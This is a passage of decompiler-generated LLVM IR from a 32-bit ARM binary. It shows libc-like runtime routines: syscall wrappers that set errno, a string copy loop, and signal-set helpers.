dec_label_pc_117c0.dec_label_pc_117f8.loopexit_crit_edge: ; preds = %dec_label_pc_117b8.dec_label_pc_117c0_crit_edge, %dec_label_pc_117c0.preheader
  %v1_117c4.lcssa = phi i32 [ %v1_117c452, %dec_label_pc_117c0.preheader ], [ %v1_117c4, %dec_label_pc_117b8.dec_label_pc_117c0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117f8

dec_label_pc_117d0.dec_label_pc_117f8.loopexit_crit_edge: ; preds = %dec_label_pc_117d0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117f8

dec_label_pc_117e0.dec_label_pc_117f8.loopexit_crit_edge: ; preds = %dec_label_pc_117e0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117f8

dec_label_pc_117f8:                               ; preds = %dec_label_pc_117b4, %dec_label_pc_117b8.dec_label_pc_117f8.loopexit_crit_edge, %dec_label_pc_117c0.dec_label_pc_117f8.loopexit_crit_edge, %dec_label_pc_117d0.dec_label_pc_117f8.loopexit_crit_edge, %dec_label_pc_117e0.dec_label_pc_117f8.loopexit_crit_edge, %dec_label_pc_11790
  %v0_11800 = phi i32 [ %v0_11794, %dec_label_pc_11790 ], [ %v1_117e4, %dec_label_pc_117e0.dec_label_pc_117f8.loopexit_crit_edge ], [ %v1_117d4, %dec_label_pc_117d0.dec_label_pc_117f8.loopexit_crit_edge ], [ %v1_117c4.lcssa, %dec_label_pc_117c0.dec_label_pc_117f8.loopexit_crit_edge ], [ %v7_117f0, %dec_label_pc_117b8.dec_label_pc_117f8.loopexit_crit_edge ], [ %v0_117b8.pr, %dec_label_pc_117b4 ]
  %v2_117f8 = icmp eq i32 %v0_11800, 0
  store i1 %v2_117f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_117f8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_117f8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_117f8
  %v1_11800 = sub i32 7, %v0_11800
  store i32 %v1_11800, i32* %r2.global-to-local, align 4
  %v3_11804 = mul i32 %v1_11800, 4
  %v4_11804 = add i32 %v3_11804, ptrtoint (i32* @global_var_1180c.349 to i32)
  call void @__pseudo_branch(i32 %v4_11804)
  %v0_1180c = load i32, i32* %r1.global-to-local, align 4
  %v1_1180c = trunc i32 %v0_1180c to i8
  %v2_1180c = load i32, i32* @r3, align 4
  %v3_1180c = inttoptr i32 %v2_1180c to i8*
  store i8 %v1_1180c, i8* %v3_1180c, align 1
  %v4_1180c = load i32, i32* @r3, align 4
  %v5_1180c = add i32 %v4_1180c, 1
  store i32 %v5_1180c, i32* %r3.global-to-local, align 4
  %v0_11810 = load i32, i32* %r1.global-to-local, align 4
  %v1_11810 = trunc i32 %v0_11810 to i8
  %v3_11810 = inttoptr i32 %v5_1180c to i8*
  store i8 %v1_11810, i8* %v3_11810, align 1
  %v4_11810 = load i32, i32* %r3.global-to-local, align 4
  %v5_11810 = add i32 %v4_11810, 1
  store i32 %v5_11810, i32* %r3.global-to-local, align 4
  %v0_11814 = load i32, i32* %r1.global-to-local, align 4
  %v1_11814 = trunc i32 %v0_11814 to i8
  %v3_11814 = inttoptr i32 %v5_11810 to i8*
  store i8 %v1_11814, i8* %v3_11814, align 1
  %v4_11814 = load i32, i32* %r3.global-to-local, align 4
  %v5_11814 = add i32 %v4_11814, 1
  store i32 %v5_11814, i32* %r3.global-to-local, align 4
  %v0_11818 = load i32, i32* %r1.global-to-local, align 4
  %v1_11818 = trunc i32 %v0_11818 to i8
  %v3_11818 = inttoptr i32 %v5_11814 to i8*
  store i8 %v1_11818, i8* %v3_11818, align 1
  %v4_11818 = load i32, i32* %r3.global-to-local, align 4
  %v5_11818 = add i32 %v4_11818, 1
  store i32 %v5_11818, i32* %r3.global-to-local, align 4
  %v0_1181c = load i32, i32* %r1.global-to-local, align 4
  %v1_1181c = trunc i32 %v0_1181c to i8
  %v3_1181c = inttoptr i32 %v5_11818 to i8*
  store i8 %v1_1181c, i8* %v3_1181c, align 1
  %v4_1181c = load i32, i32* %r3.global-to-local, align 4
  %v5_1181c = add i32 %v4_1181c, 1
  store i32 %v5_1181c, i32* %r3.global-to-local, align 4
  %v0_11820 = load i32, i32* %r1.global-to-local, align 4
  %v1_11820 = trunc i32 %v0_11820 to i8
  %v3_11820 = inttoptr i32 %v5_1181c to i8*
  store i8 %v1_11820, i8* %v3_11820, align 1
  %v4_11820 = load i32, i32* %r3.global-to-local, align 4
  %v5_11820 = add i32 %v4_11820, 1
  store i32 %v5_11820, i32* %r3.global-to-local, align 4
  %v0_11824 = load i32, i32* %r1.global-to-local, align 4
  %v1_11824 = trunc i32 %v0_11824 to i8
  %v3_11824 = inttoptr i32 %v5_11820 to i8*
  store i8 %v1_11824, i8* %v3_11824, align 1
  %v4_11824 = load i32, i32* %r3.global-to-local, align 4
  %v5_11824 = add i32 %v4_11824, 1
  store i32 %v5_11824, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_117c0, { 1, 0 }
  uselistorder i32 %v12_117ec, { 1, 2, 0 }
  uselistorder i32 %v0_117c054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_117b8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_117a8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1179c, { 1, 0 }
  uselistorder i32 %v0_11794, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 3, 1, 10, 11, 12, 13, 2, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 5, 3, 2, 1, 4, 0, 6, 8, 9, 7 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_117f8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_117d0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_11830(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11830:
  %v0_11830 = call i32 @function_158b0()
  ret i32 %v0_11830
}

define i32 @function_11840() local_unnamed_addr {
dec_label_pc_11840:
  %v0_11840 = call i32 @function_158b0()
  ret i32 %v0_11840
}

define i32 @function_11850(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11850:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_118601 = load i32, i32* @r1, align 4
  %v1_118602 = inttoptr i32 %v0_118601 to i8*
  %v2_118603 = load i8, i8* %v1_118602, align 1
  %v2_118645 = icmp eq i8 %v2_118603, 0
  store i1 %v2_118645, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_118603, i8* %arg1, align 1
  br i1 %v2_118645, label %dec_label_pc_11870, label %dec_label_pc_11858

dec_label_pc_11858:                               ; preds = %dec_label_pc_11850, %dec_label_pc_11858
  %v0_11858 = load i32, i32* @r1, align 4
  %v1_11858 = add i32 %v0_11858, 1
  store i32 %v1_11858, i32* @r1, align 4
  %v0_1185c = load i32, i32* %r2.global-to-local, align 4
  %v1_1185c = add i32 %v0_1185c, 1
  store i32 %v1_1185c, i32* %r2.global-to-local, align 4
  %v1_11860 = inttoptr i32 %v1_11858 to i8*
  %v2_11860 = load i8, i8* %v1_11860, align 1
  %v2_11864 = icmp eq i8 %v2_11860, 0
  store i1 %v2_11864, i1* %cpsr_z.global-to-local, align 1
  %v3_11868 = inttoptr i32 %v1_1185c to i8*
  store i8 %v2_11860, i8* %v3_11868, align 1
  %v0_1186c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1186c, label %dec_label_pc_11870, label %dec_label_pc_11858

dec_label_pc_11870:                               ; preds = %dec_label_pc_11858, %dec_label_pc_11850
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11858, { 1, 0 }
}

define i32 @function_11874(i32 %arg1) local_unnamed_addr {
dec_label_pc_11874:
  %stack_var_-12 = alloca i32, align 4
  %v2_1187c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1187c, i32* @r1, align 4
  %v0_11880 = call i32 @function_1611c()
  %v2_11884 = icmp eq i32 %v0_11880, 0
  %v4_11888 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_11884, i32 -1, i32 %v4_11888
  ret i32 %storemerge
}

define i32 @function_1189c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1189c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1189c = load i32, i32* @r7, align 4
  store i32 %v3_1189c, i32* %stack_var_-8, align 4
  %v0_118a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_118a8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_118a8, -4095
  br i1 %tmp, label %dec_label_pc_118c8, label %dec_label_pc_118b8

dec_label_pc_118b8:                               ; preds = %dec_label_pc_1189c
  %v0_118b8 = call i32 @function_11734()
  %v0_118bc = load i32, i32* %r7.global-to-local, align 4
  %v1_118bc = sub i32 0, %v0_118bc
  %v2_118c0 = inttoptr i32 %v0_118b8 to i32*
  store i32 %v1_118bc, i32* %v2_118c0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_118c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_118c8

dec_label_pc_118c8:                               ; preds = %dec_label_pc_1189c, %dec_label_pc_118b8
  %v1_118cc = phi i32 [ %v0_118a8, %dec_label_pc_1189c ], [ -1, %dec_label_pc_118b8 ]
  %v2_118c8 = phi i32 [ %v3_1189c, %dec_label_pc_1189c ], [ %v2_118c8.pre, %dec_label_pc_118b8 ]
  store i32 %v2_118c8, i32* @r7, align 4
  ret i32 %v1_118cc

; uselistorder directives
  uselistorder i32 %v0_118a8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_118c8, { 1, 0 }
}

define i32 @function_118d4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_118d4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_118d4 = load i32, i32* @r7, align 4
  store i32 %v3_118d4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_118fc, label %dec_label_pc_118ec

dec_label_pc_118ec:                               ; preds = %dec_label_pc_118d4
  %v0_118ec = call i32 @function_11734()
  %v0_118f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_118f0 = sub i32 0, %v0_118f0
  store i32 %v1_118f0, i32* @r3, align 4
  %v2_118f4 = inttoptr i32 %v0_118ec to i32*
  store i32 %v1_118f0, i32* %v2_118f4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11900.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_118fc

dec_label_pc_118fc:                               ; preds = %dec_label_pc_118d4, %dec_label_pc_118ec
  %v2_11900 = phi i32 [ %v3_118d4, %dec_label_pc_118d4 ], [ %v2_11900.pre, %dec_label_pc_118ec ]
  %v0_118fc = phi i32 [ %arg1, %dec_label_pc_118d4 ], [ -1, %dec_label_pc_118ec ]
  store i32 %v2_11900, i32* @r7, align 4
  ret i32 %v0_118fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_118fc, { 1, 0 }
}

define i32 @function_1190c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1190c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1190c = load i32, i32* @r7, align 4
  store i32 %v3_1190c, i32* %stack_var_-8, align 4
  %v0_11918 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11918, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11918, -4095
  br i1 %tmp, label %dec_label_pc_11938, label %dec_label_pc_11928

dec_label_pc_11928:                               ; preds = %dec_label_pc_1190c
  %v0_11928 = call i32 @function_11734()
  %v0_1192c = load i32, i32* %r7.global-to-local, align 4
  %v1_1192c = sub i32 0, %v0_1192c
  %v2_11930 = inttoptr i32 %v0_11928 to i32*
  store i32 %v1_1192c, i32* %v2_11930, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11938.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11938

dec_label_pc_11938:                               ; preds = %dec_label_pc_1190c, %dec_label_pc_11928
  %v1_1193c = phi i32 [ %v0_11918, %dec_label_pc_1190c ], [ -1, %dec_label_pc_11928 ]
  %v2_11938 = phi i32 [ %v3_1190c, %dec_label_pc_1190c ], [ %v2_11938.pre, %dec_label_pc_11928 ]
  store i32 %v2_11938, i32* @r7, align 4
  ret i32 %v1_1193c

; uselistorder directives
  uselistorder i32 %v0_11918, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11938, { 1, 0 }
}

define i32 @function_11944(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11944:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11978, label %dec_label_pc_11968

dec_label_pc_11968:                               ; preds = %dec_label_pc_11944
  %v0_11968 = call i32 @function_11734()
  %v0_1196c = load i32, i32* %r4.global-to-local, align 4
  %v1_1196c = sub i32 0, %v0_1196c
  %v2_11970 = inttoptr i32 %v0_11968 to i32*
  store i32 %v1_1196c, i32* %v2_11970, align 4
  br label %dec_label_pc_11978

dec_label_pc_11978:                               ; preds = %dec_label_pc_11944, %dec_label_pc_11968
  %v1_11980 = phi i32 [ %arg1, %dec_label_pc_11944 ], [ -1, %dec_label_pc_11968 ]
  ret i32 %v1_11980

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11978, { 1, 0 }
}

define i32 @function_11988(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11988:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11988 = load i32, i32* @r7, align 4
  store i32 %v3_11988, i32* %stack_var_-8, align 4
  %v0_11994 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11994, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11994, -4095
  br i1 %tmp, label %dec_label_pc_119b4, label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %dec_label_pc_11988
  %v0_119a4 = call i32 @function_11734()
  %v0_119a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_119a8 = sub i32 0, %v0_119a8
  %v2_119ac = inttoptr i32 %v0_119a4 to i32*
  store i32 %v1_119a8, i32* %v2_119ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_119b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_119b4

dec_label_pc_119b4:                               ; preds = %dec_label_pc_11988, %dec_label_pc_119a4
  %v1_119b8 = phi i32 [ %v0_11994, %dec_label_pc_11988 ], [ -1, %dec_label_pc_119a4 ]
  %v2_119b4 = phi i32 [ %v3_11988, %dec_label_pc_11988 ], [ %v2_119b4.pre, %dec_label_pc_119a4 ]
  store i32 %v2_119b4, i32* @r7, align 4
  ret i32 %v1_119b8

; uselistorder directives
  uselistorder i32 %v0_11994, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_119b4, { 1, 0 }
}

define i32 @function_119bc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_119bc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_119bc = load i32, i32* @r7, align 4
  store i32 %v3_119bc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_119e4, label %dec_label_pc_119d4

dec_label_pc_119d4:                               ; preds = %dec_label_pc_119bc
  %v0_119d4 = call i32 @function_11734()
  %v0_119d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_119d8 = sub i32 0, %v0_119d8
  %v2_119dc = inttoptr i32 %v0_119d4 to i32*
  store i32 %v1_119d8, i32* %v2_119dc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_119e8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_119e4

dec_label_pc_119e4:                               ; preds = %dec_label_pc_119bc, %dec_label_pc_119d4
  %v2_119e8 = phi i32 [ %v3_119bc, %dec_label_pc_119bc ], [ %v2_119e8.pre, %dec_label_pc_119d4 ]
  %v0_119e4 = phi i32 [ %arg1, %dec_label_pc_119bc ], [ -1, %dec_label_pc_119d4 ]
  store i32 %v2_119e8, i32* @r7, align 4
  ret i32 %v0_119e4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_119e4, { 1, 0 }
}

define i32 @function_119f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_119f4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_119f4 = load i32, i32* @r4, align 4
  store i32 %v3_119f4, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11a24, label %dec_label_pc_11a14

dec_label_pc_11a14:                               ; preds = %dec_label_pc_119f4
  %v0_11a14 = call i32 @function_11734()
  %v0_11a18 = load i32, i32* %r4.global-to-local, align 4
  %v1_11a18 = sub i32 0, %v0_11a18
  %v2_11a1c = inttoptr i32 %v0_11a14 to i32*
  store i32 %v1_11a18, i32* %v2_11a1c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11a28.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11a24

dec_label_pc_11a24:                               ; preds = %dec_label_pc_119f4, %dec_label_pc_11a14
  %v2_11a28 = phi i32 [ %v3_119f4, %dec_label_pc_119f4 ], [ %v2_11a28.pre, %dec_label_pc_11a14 ]
  %v0_11a24 = phi i32 [ %arg1, %dec_label_pc_119f4 ], [ -1, %dec_label_pc_11a14 ]
  store i32 %v2_11a28, i32* @r4, align 4
  ret i32 %v0_11a24

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11a24, { 1, 0 }
}

define i32 @function_11a30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11a30:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11a30 = load i32, i32* @r7, align 4
  store i32 %v3_11a30, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11a58, label %dec_label_pc_11a48

dec_label_pc_11a48:                               ; preds = %dec_label_pc_11a30
  %v0_11a48 = call i32 @function_11734()
  %v0_11a4c = load i32, i32* %r7.global-to-local, align 4
  %v1_11a4c = sub i32 0, %v0_11a4c
  store i32 %v1_11a4c, i32* @r3, align 4
  %v2_11a50 = inttoptr i32 %v0_11a48 to i32*
  store i32 %v1_11a4c, i32* %v2_11a50, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11a5c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11a58

dec_label_pc_11a58:                               ; preds = %dec_label_pc_11a30, %dec_label_pc_11a48
  %v2_11a5c = phi i32 [ %v3_11a30, %dec_label_pc_11a30 ], [ %v2_11a5c.pre, %dec_label_pc_11a48 ]
  %v0_11a58 = phi i32 [ %arg1, %dec_label_pc_11a30 ], [ -1, %dec_label_pc_11a48 ]
  store i32 %v2_11a5c, i32* @r7, align 4
  ret i32 %v0_11a58

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11a58, { 1, 0 }
}

define i32 @function_11a68(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_11a68:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11a68 = load i32, i32* @r4, align 4
  store i32 %v3_11a68, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11a98, label %dec_label_pc_11a88

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11a68
  %v0_11a88 = call i32 @function_11734()
  %v0_11a8c = load i32, i32* %r4.global-to-local, align 4
  %v1_11a8c = sub i32 0, %v0_11a8c
  %v2_11a90 = inttoptr i32 %v0_11a88 to i32*
  store i32 %v1_11a8c, i32* %v2_11a90, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11a9c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11a98

dec_label_pc_11a98:                               ; preds = %dec_label_pc_11a68, %dec_label_pc_11a88
  %v2_11a9c = phi i32 [ %v3_11a68, %dec_label_pc_11a68 ], [ %v2_11a9c.pre, %dec_label_pc_11a88 ]
  %v0_11a98 = phi i32 [ %arg1, %dec_label_pc_11a68 ], [ -1, %dec_label_pc_11a88 ]
  store i32 %v2_11a9c, i32* @r4, align 4
  ret i32 %v0_11a98

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11a98, { 1, 0 }
}

define i32 @function_11aa8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11aa8:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11adc, label %dec_label_pc_11acc

dec_label_pc_11acc:                               ; preds = %dec_label_pc_11aa8
  %v0_11acc = call i32 @function_11734()
  %v0_11ad0 = load i32, i32* %r4.global-to-local, align 4
  %v1_11ad0 = sub i32 0, %v0_11ad0
  store i32 %v1_11ad0, i32* @r3, align 4
  %v2_11ad4 = inttoptr i32 %v0_11acc to i32*
  store i32 %v1_11ad0, i32* %v2_11ad4, align 4
  br label %dec_label_pc_11adc

dec_label_pc_11adc:                               ; preds = %dec_label_pc_11aa8, %dec_label_pc_11acc
  %v1_11ae4 = phi i32 [ %arg1, %dec_label_pc_11aa8 ], [ -1, %dec_label_pc_11acc ]
  ret i32 %v1_11ae4

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11adc, { 1, 0 }
}

define i32 @function_11aec(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11aec:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11aec = load i32, i32* @r7, align 4
  store i32 %v3_11aec, i32* %stack_var_-8, align 4
  %v0_11af8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11af8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11af8, -4095
  br i1 %tmp, label %dec_label_pc_11b18, label %dec_label_pc_11b08

dec_label_pc_11b08:                               ; preds = %dec_label_pc_11aec
  %v0_11b08 = call i32 @function_11734()
  %v0_11b0c = load i32, i32* %r7.global-to-local, align 4
  %v1_11b0c = sub i32 0, %v0_11b0c
  store i32 %v1_11b0c, i32* @r3, align 4
  %v2_11b10 = inttoptr i32 %v0_11b08 to i32*
  store i32 %v1_11b0c, i32* %v2_11b10, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11b18.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11b18

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11aec, %dec_label_pc_11b08
  %v1_11b1c = phi i32 [ %v0_11af8, %dec_label_pc_11aec ], [ -1, %dec_label_pc_11b08 ]
  %v2_11b18 = phi i32 [ %v3_11aec, %dec_label_pc_11aec ], [ %v2_11b18.pre, %dec_label_pc_11b08 ]
  store i32 %v2_11b18, i32* @r7, align 4
  ret i32 %v1_11b1c

; uselistorder directives
  uselistorder i32 %v0_11af8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b18, { 1, 0 }
}

define i32 @function_11b24(i32 %arg1) local_unnamed_addr {
dec_label_pc_11b24:
  store i32 %arg1, i32* @r0, align 4
  %v3_11b24 = load i32, i32* @r4, align 4
  %v0_11b2c = call i32 @function_10f78()
  %v2_11b34 = call i32 @function_110d8(i32 %v0_11b2c, i32 %arg1)
  store i32 %v3_11b24, i32* @r4, align 4
  ret i32 %v2_11b34

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_110d8, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_10f78, { 0, 3, 2, 1 }
}

define i32 @function_11b40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11b40:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_11b58, label %dec_label_pc_11b50

dec_label_pc_11b50:                               ; preds = %dec_label_pc_11b40
  %v7_11b54 = icmp slt i32 %arg1, 65
  br i1 %v7_11b54, label %dec_label_pc_11b6c, label %dec_label_pc_11b58

dec_label_pc_11b58:                               ; preds = %dec_label_pc_11b50, %dec_label_pc_11b40
  %v0_11b58 = call i32 @function_11734()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_11b64 = inttoptr i32 %v0_11b58 to i32*
  store i32 22, i32* %v2_11b64, align 4
  %v0_11b74.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11b74

dec_label_pc_11b6c:                               ; preds = %dec_label_pc_11b50
  %v0_11b6c = call i32 @function_11c74()
  store i32 %v0_11b6c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11b74

dec_label_pc_11b74:                               ; preds = %dec_label_pc_11b58, %dec_label_pc_11b6c
  %v0_11b74 = phi i32 [ %v0_11b74.pre, %dec_label_pc_11b58 ], [ %v0_11b6c, %dec_label_pc_11b6c ]
  ret i32 %v0_11b74

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b74, { 1, 0 }
}

define i32 @function_11b84(i32* %arg1) local_unnamed_addr {
dec_label_pc_11b84:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_11b8c = add i32 %tmp, 4
  %v3_11b8c = inttoptr i32 %v2_11b8c to i32*
  store i32 0, i32* %v3_11b8c, align 4
  %v1_11b90 = load i32, i32* %r3.global-to-local, align 4
  %v2_11b90 = inttoptr i32 %v1_11b90 to i32*
  store i32 0, i32* %v2_11b90, align 4
  ret i32 0
}

define i32 @function_11b98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11b98:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11b98 = load i32, i32* @r4, align 4
  store i32 %v3_11b98, i32* %stack_var_-16, align 4
  %v6_11b98 = load i32, i32* @r5, align 4
  %v9_11b98 = load i32, i32* @r6, align 4
  %v7_11ba0 = icmp eq i32 %arg2, -1
  br i1 %v7_11ba0, label %.thread4, label %bb

.thread4:                                         ; preds = %dec_label_pc_11b98
  br label %.thread16

bb:                                               ; preds = %dec_label_pc_11b98
  %v2_11ba8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_11bc4

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11bcc

dec_label_pc_11bc4:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_11bc8 = icmp slt i32 %arg1, 65
  br i1 %v7_11bc8, label %dec_label_pc_11be0, label %dec_label_pc_11bcc

